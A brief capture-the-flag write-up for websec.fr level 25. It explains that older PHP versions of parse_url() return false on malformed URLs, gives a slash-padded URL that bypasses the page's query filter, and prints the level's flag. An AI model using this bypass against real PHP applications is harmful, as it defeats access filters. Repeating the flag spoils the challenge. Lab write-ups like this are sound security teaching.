# Level 25

1. First, lets check out what is written in http://websec.fr/level25/source.php
2. Then we would find out an interesting command 
```
parse_url($_SERVER['REQUEST_URI'])
```
3. If PHP < 5.6.28, parse_url() may return "False" if the url is really broken, so we are able to bypass query and get flag.
```
http://websec.fr//////level25/index.php?page=flag&send=Submit
```
4. Here is the flag : WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}
